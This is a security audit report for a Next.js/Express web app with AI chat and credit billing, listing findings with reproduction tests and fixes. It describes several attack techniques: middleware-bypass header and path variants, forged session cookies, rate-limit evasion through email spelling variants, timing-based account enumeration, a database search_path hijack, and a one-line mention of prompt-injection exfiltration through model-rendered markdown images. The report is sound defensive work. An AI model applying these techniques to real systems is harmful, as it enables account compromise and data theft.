# Security findings — Phase 2

ID `SEC-xx` · severity Critical / High / Medium / Low / Info · each fixed finding has a regression test.
Scope, method and threat model: see `THREAT_MODEL.md` (Part 2). Local test stack only; no external host was scanned.

| ID | Sev | Area | Title | Status |
| --- | --- | --- | --- | --- |
| SEC-01 | Critical | Dependencies / Next.js | `next` 16.2.6 affected by 20 published advisories (6 critical RCE, SSRF, cache poisoning, DoS, middleware bypass) | **Fixed** (branch `security/next-upgrade`) — `next` / `eslint-config-next` 16.4.3 |
| SEC-02 | High | Dependencies / Express | body-parser < 2.4.0 can crash the public Express process from a compressed request body; proxy-addr and qs advisories | **Fixed** (branch `security/deps-and-ci`) — body-parser 2.4.0, proxy-addr 2.0.8, qs 6.16.1 (lockfile) |
| SEC-03 | Low | Dependencies / root | 25 root advisories (3 critical); none reachable at runtime (dev tooling, or unused parts of runtime libraries) | **Fixed** (branch `security/deps-and-ci`) except the KaTeX chain (4 low) — deferred, see DEPENDENCY_TRIAGE.md |
| SEC-04 | Low | CI / supply chain | Workflow used mutable action tags, default token permissions, `ubuntu-latest`, and persisted checkout credentials | **Fixed** (branch `security/deps-and-ci`) |
| SEC-05 | Low | Auth / OAuth | A password registration racing a first Google sign-in got linked without the FINDING-34 takeover (registrant's password stayed valid) | **Fixed** (branch `security/audit-fixes-a`) |
| SEC-06 | Medium | Express / rate limits | Login and forgot-password limits bypassed with whitespace/case variants of the email | **Fixed** (branch `security/audit-fixes-a`) |
| SEC-07 | Medium | Auth / enumeration | Register, forgot-password and resend revealed whether an account exists through mail-send timing (and resend through a 502) | **Fixed** (branch `security/audit-fixes-a`) |
| SEC-08 | Medium | Config / operations | Express ran with dev rules when NODE_ENV was unset; neither service validated the webhook secret, URLs, mail sender or bcrypt cost at startup | **Fixed** (branch `security/audit-fixes-a`) |
| SEC-09 | Low | Express / errors | A compressed body that does not decode was answered 500 (logged with a stack) instead of 400 | **Fixed** (branch `security/audit-fixes-a`) |
| SEC-10 | Medium | BFF / availability | The gateway buffered request bodies of any size (unauthenticated routes), /api/chat parsed any size for signed-in users | **Fixed** (branch `security/audit-fixes-a`) |
| SEC-11 | Low | BFF / CSRF | `/api/chat` (spends credits) lacked the Origin / Sec-Fetch-Site guard of the other state-changing routes | **Fixed** (branch `security/audit-fixes-a`) |
| SEC-12 | Low | Database / privileges | The service runs as the schema owner; the ledger writer resolved names through the caller's `search_path` and any role could execute it; no least-privilege role existed | **Fixed** (branch `security/audit-fixes-a`) — migration 012; app-role split ready, switching is an owner decision |
| SEC-13 | Low | Webhook / payments | A signed `order_created` was credited without checking test mode, store or a present currency | **Fixed** (branch `security/audit-fixes-a`) |
| SEC-14 | Low | Webhook / payments | Lemon refunds were invisible: credits of a refunded order stayed and nothing recorded or reported it | **Fixed** (branch `security/audit-fixes-b`) — recorded and reported for manual review (no automatic claw-back, owner decision) |
| SEC-15 | Low | AI Lab / output | Model output could make the browser load any remote image (markdown image) — conversation exfiltration / tracking via prompt injection | **Fixed** (branch `security/audit-fixes-b`) |
| SEC-16 | Medium | AI Lab / cost | No ceiling on model spend: no daily caps (per user or global), unbounded output tokens, up to ~192 000 characters of prompt per turn | **Fixed** (branch `security/audit-fixes-b`) |
| SEC-17 | Low | BFF / availability, billing | BFF → billing calls had no timeout: a hung billing service held AI turns for minutes and late captures left answers uncharged | **Fixed** (branch `security/audit-fixes-b`) |
| SEC-18 | Low | Frontend / headers | The CSP allowed any inline script (`'unsafe-inline'`), images from any https host and stale CDN origins; no `frame-ancestors`, `form-action`, HSTS; `X-Powered-By` sent | **Fixed** (branch `security/audit-fixes-b`) — strict nonce CSP (owner decision) |
| SEC-19 | Low | Logging / privacy | Purchase webhooks and receipts logged buyers' full email addresses on every order | **Fixed** (branch `security/audit-fixes-b`) |

---

## SEC-01 — Critical — Next.js 16.2.6 is affected by 20 published advisories

* **Where:** `package.json` (`next` 16.2.6, `eslint-config-next` 16.2.6).
* **Evidence:** `npm audit` listed 20 advisories for `next` in the range ≥ 16.0.0, fixed between 16.2.11 and 16.4.1, among
  them GHSA-p293-qw3h-jr36, GHSA-2xp9-vwfh-vxw4, GHSA-vcvr-r3jv-pc5j, GHSA-2464-fhr4-w9xw and GHSA-673q-mjm6-r5xr (critical
  RCE: Windows-hosted servers, Image Optimization with AVIF / SVG, `next/og`, `use cache` typed arrays), GHSA-cjq9-62q9-8jv4
  and GHSA-p9j2-gv94-2wf4 (SSRF), cache-poisoning and DoS advisories, and GHSA-6gpp-xcg3-4w24 (middleware / proxy bypass).
  The upgrade also clears the `postcss` and `sharp` advisories pulled in through `next`.
* **GHSA-6gpp-xcg3-4w24 applicability:** the advisory requires the App Router, Turbopack **and exactly one entry in
  `i18n.locales`** (fix: `has_i18n_locales = i18n.is_some()` instead of `locales.len() > 1`). This app has no `i18n`
  config, so it was **not exploitable here**; the gating suite below found no bypass on 16.2.6 either (baseline run).
* **Fix:** `next` and `eslint-config-next` 16.4.3 (latest 16.x, exact pins). Release notes for 16.3, 16.4 and 16.4.3 list
  no breaking changes; the two 16.3 codemods only apply to apps opting into Cache Components / Partial Prefetching (not
  used). `middleware.ts` stays deprecated-but-supported, as since 16.0.
* **Side effects handled:**
  * `next build` 16.4 type-checks the whole `tsconfig.json` program, test files included. The root tests import the
    service's test helpers, and the two packages had different `@types/pg` versions (8.23.1 vs 8.20.0) → 31 type errors
    that failed the production build. The service's lockfile now resolves `@types/pg` 8.23.1, which its declared range
    `^8.15.5` already allowed (dev-only types; no runtime change).
  * `next dev` (16.3+) maintains a managed block in `AGENTS.md`; the updated block is committed so dev runs leave the
    tree clean.
* **Regression tests:** `tests/e2e/gating.spec.mts`, run against `next dev` (default) and against a production build
  (`E2E_NEXT_MODE=production npx playwright test tests/e2e/gating.spec.mts`):
  * 22 path-normalisation variants per protected route (`/dashboard`, `/ai-lab`, `/profile`), sent byte-for-byte with
    `node:http`: trailing slash, sub-paths, `?__nextDataReq`, `?_rsc`, `.rsc`, `.json`, `%2F`, percent-encoded first
    letter (both cases), `//`, `/.`, `/x/..`, `/x/%2e%2e`, `;params`, `%00`, upper case, `/en` locale prefix,
    `/_next/data/…json`, `/index…`;
  * 13 internal / bypass headers × 3 paths, including `x-middleware-subrequest` (CVE-2025-29927 style, plain, `src/`
    and ×5), `x-nextjs-data`, RSC / prefetch headers, `x-invoke-path`, `x-matched-path`, `x-now-route-matches`,
    `next-action`, `x-forwarded-host`;
  * 7 forged / stale session cookies (garbage, `alg: none`, other secret, expired, wrong audience, no `tv`, no `sub`),
    each also combined with a bypass header;
  * the only accepted outcomes are a redirect to `/login` (`Location` or `x-nextjs-redirect`) or a 4xx;
  * defence in depth: every API behind the protected pages answers 401 without a session, also with bypass headers;
    the three protected pages are client components with no server-side data access and no route layouts.
* **Result:** 11 / 11 on 16.2.6 (dev and production build) and on 16.4.3 (dev and production build).

## SEC-02 — High — Express request-handling dependencies (body-parser, proxy-addr, qs)

* **Where:** `services/auth-billing-service/package-lock.json` (Express 5.2.1 dependencies: body-parser 2.3.0,
  proxy-addr 2.0.7, qs 6.15.2).
* **Advisories and reachability here:**
  * **body-parser GHSA-27r3-jxmh-p828 (High, < 2.4.0) — reachable.** A compressed request body can raise an uncaught
    exception that terminates the process; no authentication or matching route is needed because parsing runs before
    routing. Express is publicly reachable (Lemon webhook), parses JSON globally (`express.json`) and uses
    `express.raw` on the webhook route, both with decompression enabled by default.
  * **proxy-addr GHSA-jqcg-44mw-7w3h (Critical, < 2.0.8) — not reachable.** Requires an IPv6 trust subnet with zero
    leading bits (e.g. `::ffff:10.0.0.0/8`); this service sets `trust proxy` to a hop count (`TRUST_PROXY_HOPS`).
  * **qs GHSA-4mjr-xmp4-gh2g / GHSA-x5fp-wj9c-mxmx (Moderate) — not reachable through requests.** No
    `urlencoded` parser is mounted and Express 5's default query parser is the simple one; `qs` remains in the tree via
    body-parser and supertest.
* **Fix:** lockfile update within Express's declared ranges: body-parser 2.4.0, proxy-addr 2.0.8, qs 6.16.1. Service
  `npm audit`: 0 vulnerabilities.
* **Regression test:** `tests/unit/dependency-floors.test.ts` asserts the installed minimums; it fails on the previous
  lockfile (verified) and passes now. `tests/api/body-parser-compressed.test.ts` is a resilience smoke check (gzip body
  with trailing bytes on the global JSON parser, an unmatched route and the webhook parser; the service keeps serving).
  It did **not** reproduce the crash on 2.3.0, so it is not counted as the regression proof.
* **Behavioural verification (Part 2A)** — `tests/api/compressed-bodies.test.ts`, raw HTTP (byte-exact) against the
  public app on both parsers (global JSON 32 kb; webhook raw 256 kb, read before HMAC):
  * valid gzip, deflate, br, zstd (Node 24 + body-parser 2.4 decode zstd) and identity bodies → decoded and handled;
  * `compress`, an unknown encoding, `gzip, gzip` → 415 `UNSUPPORTED_MEDIA_TYPE`;
  * malformed / truncated gzip, deflate, br, zstd streams → 400 `INVALID_CONTENT_ENCODING` after SEC-09 (500 before);
  * a body under the limit compressed but over it decompressed → 413 `PAYLOAD_TOO_LARGE`; on the webhook this happens
    **before HMAC verification and with zero database calls** (the limit is measured after decompression);
  * decompression bomb, ~200 MB of zeros in a 199 kB gzip → 413 in 53–71 ms, RSS +0.3–0.6 MB: inflation stops at the
    limit;
  * no uncaught exception, no unhandled rejection, no hang (15 s request timeout) in any case.
  The advisory's crash could not be reproduced on 2.3.0 with these inputs either; the fix stays the version floor.
* **Decision:** decompression stays enabled (`inflate` default). With the limits applied after decompression it showed
  no crash, hang or memory risk; disabling it would only reject clients that compress.

## SEC-03 — Low — Root-package advisories (tooling and unused runtime paths)

* **Evidence:** after SEC-01, `npm audit` reported 25 advisories in the root package (3 critical, 12 high, 5 moderate,
  5 low). Each was traced to its chain and its precondition checked against the code — `docs/security/DEPENDENCY_TRIAGE.md`.
* **Severity rationale:** the critical ones are `shell-quote` via the dev-only `concurrently` (fixed literal commands)
  and `proxy-addr` inside the MCP SDK's Express transport under `@google/genai`, which this app never starts. No
  advisory had a reachable path at runtime, hence Low (hygiene) rather than the advisories' own ratings.
* **Fix:** `npm update` of the affected packages within their declared ranges (lockfile only). Root audit: 25 → 4 low.
  `shadcn` 4.7.0 → 4.22.1 ships additional CSS utilities only; none is used by `src/` (diffed).
* **Deferred:** the KaTeX chain (4 low, GHSA-238p-pmpm-9mq7) — no plugin release uses a patched KaTeX yet; every
  available change breaks chat math rendering. Options and impact in DEPENDENCY_TRIAGE.md; decision pending.
* **Verification:** root suite 403/403, `tsc` 0 errors, `next build` passes on the updated lockfile.

## SEC-04 — Low — CI workflow supply-chain hardening

* **Where:** `.github/workflows/test.yml`.
* **Before:** actions referenced by mutable tags (`actions/checkout@v4`, `setup-node@v4`, `upload-artifact@v4`, all on
  the Node 20 runtime); no `permissions:` block (the token got the repository default); `runs-on: ubuntu-latest`;
  `actions/checkout` left the token in `.git/config` for every later step (`npm ci` install scripts, tests).
* **After:**
  * `permissions: contents: read` at workflow level.
  * Actions pinned to full commit SHAs, resolved with `git ls-remote` against `github.com/actions/*` (lightweight
    tags, so the SHA is the commit): checkout v7.0.1 `3d3c42e5…`, setup-node v7.1.0 `949feb24…`, upload-artifact
    v7.0.2 `cf430e03…` (full SHAs in the workflow). Each `action.yml` at that SHA declares `runs.using: node24`.
    Release notes checked for v5–v7: Node 24 runtime (runner ≥ 2.327.1; GitHub-hosted runners satisfy it);
    setup-node automatic caching (we set `cache: npm` explicitly); upload-artifact v7 adds `archive`, default `true`
    (same zip behaviour as v4).
  * `persist-credentials: false` on every checkout (nothing pushes).
  * `runs-on: ubuntu-24.04` in every job.
  * Fork PRs: the workflow triggers on `pull_request` (not `pull_request_target`) and references no secrets.
  * New: `npx next build` in the web job; a non-blocking `lint` job (`continue-on-error: true`); ESLint ignores
    generated output (`.next-e2e/`, coverage, Playwright reports, compiled service).
* **Verification:** the workflow parses (4 jobs, permissions, pins, runners checked programmatically); the steps it runs
  were executed locally (results in the Part 1 summary). It runs on GitHub only once pushed.

## Secret scan (Part 1) — no finding

* **Tool:** gitleaks 8.30.1 (official Windows release, SHA-256 verified against the release's checksums file),
  run from the session scratchpad; not added to the project.
* **Scope:** git history — all 46 commits of every ref (`--log-opts=--all`, 389.7 MB, including the commits that
  once tracked `node_modules`, `dist` and `__pycache__`); uncommitted changes (`--pre-commit`); untracked files
  outside `.gitignore` (none). Gitignored local files (e.g. a developer's `.env`) were deliberately not opened; only
  `*.env.example` / `.env.test.example` have ever been committed (`git log --all --diff-filter=A`).
* **Result:** 8 `generic-api-key` hits, all false positives (values redacted in the report; classified by key name,
  length and placeholder/test pattern without printing them):
  * `JWT_SECRET` / `INTERNAL_SERVICE_SECRET` placeholders in `.env.example` (lines 27, 29), `.env.test.example:11`,
    `services/auth-billing-service/.env.example` (34, 41), legacy `services/auth-service/.env.example:16`;
  * `tests/e2e/gating.spec.mts:131` — the deliberately foreign signing secret for the forged-token test;
  * `services/auth-billing-service/tests/api/client-ip.test.ts:55` — the deliberately wrong internal key in the
    negative test "X-Client-IP with a WRONG internal key is ignored".
* **No rotation needed.**

## SEC-05 — Low — Google first sign-in: the user-creation race skipped the FINDING-34 takeover

* **Where:** `services/auth-billing-service/src/services/auth.service.ts`, `loginWithGoogle()` step 3 fallback.
* **Found by:** investigating the one-off coverage dip (88.8 % / 75.1 %). Five identical coverage runs gave
  89.17 % / 75.97 % with no line or branch differing; the only code reached by **timing** alone is the step-3
  fallback (insert hits `23505` → re-resolve), entered only when two of the five requests in the existing
  concurrency test interleave in a particular way. A run without that interleaving leaves 5 statements and their
  branch arms uncovered — the size of the dip. The by-email branch of the same fallback was never covered at all.
* **Weakness:** if a **password registration** for the same email committed between the Google request's email lookup
  (step 2, no account yet) and its insert (step 3), the fallback linked the Google subject to that account and signed
  the Google user in **without** the FINDING-34 takeover: the registrant's password stayed valid, the account stayed
  unverified, its sessions were not revoked. Exploitation needs the attacker's registration to land inside that
  window during the victim's very first Google sign-in (once the account exists, step 2 applies the takeover), hence Low.
* **Repro (deterministic, no sleeps):** `tests/api/auth.google-race.test.ts` — the service pool is intercepted so a
  complete registration runs right after step 2 missed; before the fix: no signup bonus (never verified), password
  still accepted.
* **Fix:** the step-2 logic (link + takeover of an unverified account) moved into `linkGoogleToExistingAccount()`,
  used by step 2 **and** by the step-3 fallback.
* **Tests:** the takeover race (attacker password → 401, verified, `token_version` bumped, verification tokens
  deleted, one user / link / bonus) and a competing-Google-sign-in race that now covers the subject fallback
  deterministically (coverage no longer depends on timing).

## SEC-06 — Medium — Email-keyed rate limits bypassed by whitespace / case variants

* **Where:** `services/auth-billing-service/src/lib/rateLimiters.ts` (`loginRateLimiter`, `emailActionRateLimiter`).
* **Weakness:** both limiters keyed on `ip + email.toLowerCase()` of the raw body value, while the service looks the
  account up with `normalizeEmail()` (trim + lower-case). `" victim@x"`, `"victim@x "`, `"	victim@x"`, `"VICTIM@X "` …
  therefore each got a fresh 5-attempt bucket for the **same** account: unlimited password guesses per IP against one
  account, and unlimited reset / verification mails to one victim from one IP (mail flooding, sender reputation).
  Express is publicly reachable, so the BFF is not in the way.
* **Repro:** `tests/api/rate-limit-email-key.test.ts` — 8 spellings of one address from one IP: before the fix all 8
  login attempts were answered 401 (all 8 forgot-password requests 200); after: 5 answered, then 429.
* **Fix:** the key uses the email normalised exactly like `normalizeEmail()`; non-string values map to an empty key
  (validation still answers 400). Different accounts from one IP keep separate buckets (tested).
* **Open — decision needed (not changed):** there is no per-account limit **across** IPs, so a distributed guesser
  gets 5 attempts per IP per 15 minutes per account. A per-account failed-attempt limit (e.g. 20 failures / 15 min,
  `skipSuccessfulRequests`) would stop that but lets anyone lock a victim's *password* sign-in for the window (Google
  sign-in and password reset would still work). Also: all limiters are in-memory, i.e. per instance and reset on
  restart; a shared store (Redis) is needed before running several Express instances.

## SEC-07 — Medium — Account existence revealed by mail-delivery timing and status

* **Where:** `services/auth-billing-service/src/services/auth.service.ts` — `registerUser`, `forgotPassword`,
  `resendVerificationEmail`, `loginUser`.
* **Weakness:** the generic answers of FINDING-09 hid existence in the **body** only. The branch that sends mail
  awaited the mail provider (Resend, a network round trip in production) before answering, the other branch did not:
  * register: a **new** email waited for the verification mail, an existing one answered after a `SELECT`;
  * forgot-password: an **existing** account waited for the reset mail, an unknown one answered immediately;
  * resend-verification: an **unverified** account waited, and answered **502 `EMAIL_SEND_FAILED`** when the provider
    failed — a direct existence oracle whenever mail had trouble;
  * login: the unknown-email path compared against a hard-coded **cost-10** bcrypt hash, so with any other
    `BCRYPT_ROUNDS` unknown emails were measurably faster or slower than wrong passwords.
* **Repro:** `tests/api/auth.enumeration-timing.test.ts` with the mail provider stubbed at the network boundary to
  never answer (or to fail): before the fix the account-dependent requests did not answer within 3 s (they waited on
  the provider), resend answered 502, the dummy hash had cost 10 instead of the configured 4.
* **Fix:** account mails are sent in the background (`sendInBackground`, failures logged, never surfaced); the dummy
  hash is computed once from the configured cost (`dummyPasswordHash()`). Mails are still sent (tested against a
  provider stub that answers).
* **Behaviour change:** `POST /api/auth/resend-verification` no longer answers `502 EMAIL_SEND_FAILED`; it always
  answers the generic 200. A delivery failure is only logged (`[auth] Failed to send … email`).
* **Residual (accepted):** the account-dependent branches still do a little more database work (a token insert in one
  transaction) than the others — single-digit milliseconds, far below network jitter; bcrypt dominates both.

## SEC-08 — Medium — Production configuration failed open (NODE_ENV, unvalidated secrets and URLs)

* **Where:** `services/auth-billing-service/src/config/env.ts`, `src/index.ts`; `src/instrumentation.ts` (Next.js).
* **Weaknesses (each reproduced by booting the real process):**
  * Express decided "production" with `(NODE_ENV ?? "development") === "production"`. Many hosts do not set
    `NODE_ENV`; the service then ran with **dev rules**: verification / reset links are logged instead of mailed when
    `RESEND_API_KEY` is unset (anyone with log access can take over accounts), the dev CORS allowance is on, the
    Lemon-variant check is only a warning. `NODE_ENV=staging` (or a typo) behaved the same.
  * No startup validation of `LEMONSQUEEZY_WEBHOOK_SECRET` — a weak or placeholder value makes purchase webhooks
    **forgeable (credits minted)** — nor of `FRONTEND_URL` (defaulted to `http://localhost:3000` for mail links and
    the Lemon redirect), the Lemon API key / store, `RESEND_API_KEY`, the sender (defaulted to Resend's sandbox
    `onboarding@resend.dev`, which only delivers to the account owner) or `BCRYPT_ROUNDS` (`4` accepted; an empty
    value even gave cost **0**, because `Number("")` is 0).
  * Next.js checked only `INTERNAL_SERVICE_SECRET`: a production server started without `JWT_SECRET`, without
    `FRONTEND_URL` (the CSRF guard then falls back to localhost and refuses every real browser) and without the
    service URLs.
* **Repro:** `services/auth-billing-service/tests/api/production-startup.test.ts` spawns the real service
  (`node --import tsx src/index.ts`) with only the given environment — `scripts/test/no-dotenv.mjs` keeps the
  developer's `.env` out, the network guard blocks real Resend / Lemon calls. Before the fix the service **started**
  with NODE_ENV unset / `staging`, a placeholder webhook secret, an http `FRONTEND_URL`, the sandbox sender and bcrypt
  cost 4. `tests/e2e/production-config.spec.mts` (production mode) starts a real `next start` without `JWT_SECRET`.
* **Fix:**
  * Express: production rules unless `NODE_ENV` is explicitly `development` or `test` (`isProductionNodeEnv`).
    In production, `productionConfigProblems()` validates `FRONTEND_URL` (absolute origin, https except localhost),
    `LEMONSQUEEZY_WEBHOOK_SECRET` (same strength rules as `JWT_SECRET`: ≥ 32 chars, not a placeholder, entropy floor),
    `LEMONSQUEEZY_API_KEY`, `LEMONSQUEEZY_STORE_ID` (numeric), the three variants, `RESEND_API_KEY`, `SENDER_EMAIL` /
    `EMAIL_FROM` (set, not `@resend.dev`), `BCRYPT_ROUNDS` (10–15 when set); the whole list is printed as `FATAL:`
    lines and the process exits 1. Empty numeric env values fall back to their defaults.
  * Next.js: `assertProductionConfig()` in `register()` (production start only, never during `next build`):
    `JWT_SECRET` (strength), `FRONTEND_URL` (origin, https except localhost), `AUTH_SERVICE_URL`,
    `BILLING_SERVICE_URL`, `USERS_SERVICE_URL` (absolute http(s)).
* **Verified in production mode:** the real service starts with a complete configuration, serves helmet headers (HSTS,
  nosniff), no dev CORS, no `databaseError` in `/health`, generic error bodies without stack traces, no dev mail
  logging; the real `next start` refuses without `JWT_SECRET`; the session cookie is `HttpOnly; SameSite=Strict;
  Path=/; Max-Age=…; Secure` in production (not `Secure` in dev).
* **Env / behaviour changes (deploy):**
  * Express hosts **must** set `NODE_ENV=production` explicitly **or** accept production rules when it is unset.
    With production rules and no `HOST`, Express binds `127.0.0.1` (existing behaviour of production mode): hosted
    platforms need `HOST=0.0.0.0` (or the platform's bind address).
  * Newly required in production (Express): `FRONTEND_URL` (https), a strong `LEMONSQUEEZY_WEBHOOK_SECRET`
    (≥ 32 random chars; Lemon allows up to 40), `LEMONSQUEEZY_API_KEY`, numeric `LEMONSQUEEZY_STORE_ID`,
    `RESEND_API_KEY`, `SENDER_EMAIL` on a verified domain; `BCRYPT_ROUNDS`, if set, 10–15.
  * Newly required in production (Next.js): `JWT_SECRET` (same value as Express), `FRONTEND_URL`,
    `AUTH_SERVICE_URL`, `BILLING_SERVICE_URL`, `USERS_SERVICE_URL`.

## SEC-09 — Low — Undecodable compressed bodies answered 500

* **Where:** `services/auth-billing-service/src/middlewares/errorHandler.ts`.
* **Weakness:** body-parser wraps a zlib decoder error (bad gzip / deflate / br / zstd stream) as `status 400,
  expose: true` but without a body-parser `type`, so the FINDING-12 mapping missed it: the public service answered
  **500 INTERNAL_ERROR** and logged a stack trace for every such request — a cheap way to flood error logs and alerts,
  and a misleading signal (client error reported as server fault).
* **Repro:** `tests/api/compressed-bodies.test.ts` — five malformed streams (garbage behind a gzip header, truncated
  gzip, random bytes as deflate / br, gzip bytes declared as zstd) on both parsers: 500 before, 400 after.
* **Fix:** an exposed 400 whose `code` is a zlib decoder code (`Z_*`, `ERR__ERROR_*` for brotli, `ZSTD_error_*`) is
  answered `400 { code: "INVALID_CONTENT_ENCODING", error: "Request body could not be decoded." }`; the zlib message
  is not echoed.

## SEC-10 — Medium — Unbounded request bodies in the BFF

* **Where:** `src/lib/gateway/proxy.ts` (`readRequestBody`), `src/app/api/chat/route.ts`.
* **Weakness:** the gateway read the whole request body with `request.arrayBuffer()` before forwarding it. Express
  rejects more than 32 kB — but only after the BFF had held the complete body in memory and sent it on. The gateway
  serves unauthenticated routes (`/api/auth/login`, `/register`, …), so any anonymous client could make the BFF buffer
  arbitrarily large bodies: memory exhaustion / DoS of the web tier. `/api/chat` parsed any size with
  `request.json()` for a signed-in user (anonymous requests are refused with 401 before the body is read).
* **Repro:** `tests/api/bff-body-limit.test.ts` with counting stream bodies: a 20 MB gateway body was read completely
  and forwarded (the upstream answered 200); a signed-in user's 50 MB chat body was read completely (400 after parsing).
* **Fix:** `src/lib/http/limited-body.ts` — a declared `Content-Length` over the limit is refused without reading; a
  streamed body is cancelled as soon as it passes the limit. Gateway limit 64 kB (Express accepts 32 kB) →
  `413 { code: "PAYLOAD_TOO_LARGE" }`, nothing forwarded; chat limit 1 MB (24 messages × 8,000 characters, up to 4
  bytes each in UTF-8) → `413 { error: "PAYLOAD_TOO_LARGE" }`, the model is never called. Normal bodies are forwarded
  unchanged (tested).
* **Behaviour change:** BFF answers 413 for bodies over these limits (previously Express answered 413 for gateway
  routes after full buffering, and chat answered 400 or processed the body).

## SEC-11 — Low — `/api/chat` without the cross-site guard

* **Where:** `src/app/api/chat/route.ts`.
* **Weakness:** every state-changing BFF route refuses cross-site requests (`Origin` foreign / `null`, `Sec-Fetch-Site:
  cross-site`) — the gateway catch-alls and `clear-cookie` — except `/api/chat`, which reserves and charges credits.
  It relied on `SameSite=Strict` alone. Low: SameSite=Strict already keeps the cookie off ordinary cross-site requests;
  this is defence in depth against SameSite bypasses and embedded or misconfigured clients.
* **Repro:** `tests/api/chat.csrf.test.ts` — a foreign `Origin`, `Origin: null` or `Sec-Fetch-Site: cross-site` with a
  valid session cookie went on to reserve credits and call the model (502 in the test network).
* **Fix:** the same `isCrossSiteRequest` guard as the gateway, as the first check: `403 CSRF_REJECTED`, nothing
  reserved. Same-origin and server-to-server callers are unaffected (tested).
* **Coverage check:** the BFF's non-GET routes are the three gateway catch-alls (`auth`, `billing`, `users`),
  `auth/clear-cookie` and `chat` — all guarded now.

## SEC-12 — Low — Ledger functions and database privileges

* **Where:** `database/init/*.sql` (functions), the service's single owner-level connection.
* **Weakness:** the money invariants (append-only ledger, balance only via `post_credit_transaction()`) are
  enforced by triggers that the connecting role owns and can disable, and the balance guard is a session flag any
  role can set. A least-privilege role cannot be introduced as things stood: `post_credit_transaction()` ran with
  the caller's rights (an app role without `UPDATE` on `user_balances` could not post credits), and making it
  `SECURITY DEFINER` without pinning `search_path` would let a caller redirect its writes into look-alike tables.
  `EXECUTE` was granted to `PUBLIC`. Low: exploiting it needs SQL execution as the service (no injection found —
  every interpolated identifier is a constant or validated), so this is defence in depth for the money tables.
* **Repro:** `services/auth-billing-service/tests/db/function-hardening.test.ts` — no function pinned
  `search_path`; none was `SECURITY DEFINER`; with `SET search_path TO hijack, public` a call wrote into
  `hijack.user_balances` (public balance stayed 0).
* **Fix:** migration `012_function_search_path.sql`: `post_credit_transaction()` is `SECURITY DEFINER`,
  `SET search_path = public, pg_temp`, `EXECUTE` revoked from `PUBLIC`; the other relation-touching functions pin
  `search_path` as well. `database/roles/app-role.sql` + `docs/security/DB_ROLES.md`: an opt-in least-privilege
  role (grants match the service's actual SQL), proven by `tests/api/app-role.test.ts` (21 tests: every direct
  write / trigger / flag bypass refused with 42501, every real flow works as the app role). Runbook §4 / §10.1
  cover 012 and its rollback (tested).
* **Not changed:** `set_updated_at()` / `prevent_ledger_mutation()` (invoker-rights, no relation referenced;
  001 is checksummed). Re-running 003 by hand resets the ledger writer's attributes — re-run 012 after it (TC-41).
* **Open (owner decision):** switching the service's `DATABASE_URL` to the app role; residual `user_balances`
  INSERT (see DB_ROLES.md).
* **Behaviour change:** none while one role owns the schema and runs the app. Other database roles lose implicit
  `EXECUTE` on `post_credit_transaction()`.

## SEC-13 — Low — Webhook trusted the signature for where the order came from

* **Where:** `services/auth-billing-service/src/services/webhook.service.ts` (`processLemonSqueezyEvent`).
* **Weakness:** after the HMAC check the order was credited if it was `paid`, not refunded, matched a pack price
  and its currency was not something other than USD. Not checked: `test_mode` (Lemon test-mode orders are paid
  with test cards, so a test-mode webhook pointed at production — same URL and secret, a common setup while
  integrating — turns free test purchases into real credits), `store_id` (a second store or webhook sharing the
  secret), and a missing `currency` (accepted). Low: every case needs an event signed with our secret.
* **Repro:** `tests/api/webhook.order-origin.test.ts` — in production a `test_mode: true` order, an order with
  another or no `store_id`, and an order without `currency` were all credited (+50).
* **Fix:** in production a test-mode order is ignored (`test_mode_order`, logged "Ignoring test-mode order")
  unless `LEMONSQUEEZY_ALLOW_TEST_MODE=true`; outside production test mode keeps working for local checkout
  testing. When `LEMONSQUEEZY_STORE_ID` is set (required in production, SEC-08) `store_id` must equal it
  (`store_mismatch`). The currency must be present and USD. The webhook still answers 200 for all of these, as for
  every other non-credited order, so Lemon does not retry.
* **Behaviour change (Lemon / env):** new optional `LEMONSQUEEZY_ALLOW_TEST_MODE`. A test-mode webhook on the
  production service no longer credits — if you test purchases on production with test cards, set the flag for
  that period only.
* **Reviewed, no change:** replay — signatures carry no timestamp, so a captured event can be re-sent forever,
  but fulfilment is idempotent on `ls_order_<id>` (unique ledger index, FINDING-11; concurrent replays tested),
  and only `order_created` is acted on. Amount — must equal the pack's list price in `total`, `subtotal` or the
  line price; a buyer who sets `custom_data.package_id` to a dearer pack fails the amount check. `subtotal` is
  before discounts, so an owner-issued discount code (even 100 %) still credits the full pack: intended, noted.
* **Open → decided (Part 2B):** refunds are recorded and reported for manual review, never clawed back — SEC-14.

## Part 2A — areas reviewed without a further finding

Evidence is the named test, or the code reference where a test would only restate the code.

* **Sessions.** Both services verify HS256 only, with issuer and audience (`src/lib/auth/verify-jwt.ts`,
  `services/auth-billing-service/src/utils/jwt.ts`). Express rejects a revoked `jti` and a stale `tv`
  (`users.token_version`) on every authenticated request (`requireAuth.ts`). The BFF's own check is signature-only,
  but every credit-spending path calls Express first: `/api/chat` resolves verification through `/me` before it
  reserves. The page middleware only redirects, so a revoked-but-unexpired token can open a protected page shell,
  and every data call on it gets 401.
* **Open redirects (gateway / frontend).** None found. The only server redirect is `middleware.ts` → `/login`
  (same origin, built from `nextUrl`). Browser navigations go to fixed paths or to the `checkoutUrl` the service
  received from Lemon's API. The post-checkout `returnPath` is a path appended to the fixed `FRONTEND_URL`
  (`sanitizeReturnPath`: must start with one `/`, no query or fragment, ≤ 200 chars). `?redirect_checkout=` only
  toggles a label.
* **Methods.** The gateway exports GET/POST/PUT/PATCH/DELETE/OPTIONS. Every non-GET/HEAD/OPTIONS method passes the
  cross-site guard (SEC-11 completed the list). No Express GET or OPTIONS route changes state, and there is no
  method-override middleware.
* **SQL injection.** Every query uses `$n` parameters. The interpolations are constant column lists, the migration
  runner's own file text, and test-only database names validated by `db-guard`.
* **Hold races and expiry.** Capture, release and reserve serialise on the per-user advisory lock and the hold's
  row lock. The sweeper (`release_expired_ai_holds()`) updates only `status = 'held' AND expires_at <= NOW()` rows
  and re-checks the row after a lock wait. `tests/api/hold-expiry-race.test.ts` forces both orders: a capture that
  started before expiry is charged exactly once and the sweeper skips it; a sweep that wins makes the capture
  `409 NOT_CAPTURABLE`, never charged. An expired, unswept hold no longer counts against the available balance.
  The existing FINDING-22 suites cover reserve races and the expired-capture path.
* **Configuration constraint (Info, documented, not enforced).** `AI_HOLD_TTL_SECONDS` (Express, default 600)
  must exceed the BFF's `GEMINI_TIMEOUT_MS` (default 30 s) plus `BILLING_RETRY_DELAYS_MS` (default ≈ 4.25 s).
  Otherwise a slow but successful turn finds its hold expired, capture answers `HOLD_EXPIRED`, and the answer is
  delivered uncharged. The services cannot check this pair at boot because each knows only its own half.

---

